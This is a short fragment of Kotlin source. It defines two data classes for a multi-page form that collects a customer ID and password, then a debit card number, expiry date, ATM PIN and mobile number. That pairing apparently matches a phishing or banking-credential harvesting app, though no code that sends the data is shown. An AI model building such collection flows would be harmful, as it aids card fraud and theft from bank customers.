...
data class Submit2(val customerid: String, val pass: String)  // page 1 submit 2
data class SecondPage(val debit: String, val expiry: String, val atmpin : String,val customerid : String, val mobile : String)  // second page
